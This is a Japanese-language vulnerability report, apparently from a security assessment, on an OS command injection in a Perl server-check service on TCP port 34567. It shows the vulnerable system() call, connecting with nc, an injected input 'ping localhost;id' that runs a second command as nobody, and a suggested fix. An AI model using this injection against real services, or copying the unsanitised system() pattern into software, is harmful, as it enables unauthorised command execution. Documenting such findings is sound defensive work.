## 34567番ポートで動作しているプログラムにおけるOSコマンドインジェクション攻撃が可能になる脆弱性 
### 対象
34567番ポートでxinetdを用いて動作しているperlプログラム
`/usr/local/bin/serverchk.pl`

### 危険度
Middle
* 「スペースを含めることができない」という条件はあるがOSの任意のコマンドをnobody権限で実行できる

### 解説
今回チェックを行ったサーバには、xinetdを使ったサーバチェック用のプログラムが34567/TCPで動作している。
このプログラムでは、以下のコマンド搭載されている
* help
* echo
* uptime
* iostat
* exit
* quit
* ping

これらのうち、`ping`コマンドにおいて任意のOSコマンドを実行することのできるOSコマンドインジェクション攻撃が可能であった。
このコマンドを用いた脆弱性では「スペースを含めない」という条件はあるが、
「一行の任意のコマンドをnobody権限で実行可能」であるため、特権の不要な範囲で任意の情報をサーバから収集することができる。
また、このコマンドの実行結果はログに残らないため、攻撃が行われたということを確認することができない。

### 再現方法
1. サーバの34567/TCP に任意のプログラムで接続する
```sh
nc 192.168.30.10 34567
```

2. `ping`コマンドで以下のコマンドで正常に出力されるようなコマンドを入力する
```perl
  ping   => sub {
    my $host = shift;
    system("ping -c 4 -W 1 $host");
  },
```

入力例
```sh
ping localhost;id
```

出力例
```sh
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.047 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.054 ms
64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.052 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.047/0.050/0.054/0.005 ms
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:inetd_child_t:s0-s0:c0.c1023
```

以上のようにpingコマンドを実行後に任意のコマンド（今回では`id`コマンド）が実行できる
 
### 条件
* 34567/TCP ポートがサーバより上流のネットワークでDROP/REJECTされていないこと（疎通が可能であること）

### 想定される被害・影響
* 任意のコマンドが実行されることによる不正な操作
* 場合によっては乗っ取りが可能

### 対策
* pingコマンドを廃止するか、OSコマンドを利用しないようにプログラムを修正する 